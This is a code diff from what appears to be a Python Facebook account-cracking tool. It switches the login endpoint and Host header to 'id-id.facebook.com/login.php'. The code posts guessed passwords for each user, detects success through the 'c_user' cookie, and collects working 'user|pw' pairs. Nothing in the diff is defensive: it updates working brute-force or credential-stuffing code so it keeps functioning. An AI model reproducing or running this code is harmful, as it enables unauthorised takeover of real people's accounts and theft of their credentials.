@@ -40,9 +40,9 @@ class __crack__:
             pw = pw.lower()
             ngUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36'
             ses = requests.Session()
-            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ngUA,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-            p = ses.get("https://www.facebook.com")
-            b = ses.post("https://id-id.facebook.com/login/device-based/regular/login/?login_attempt=1", data={"email": user, "pass": pw, "login": "submit"})
+            ses.headers.update({"Host":"id-id.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ngUA,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            p = ses.get("https://id-id.facebook.com")
+            b = ses.post("https://id-id.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
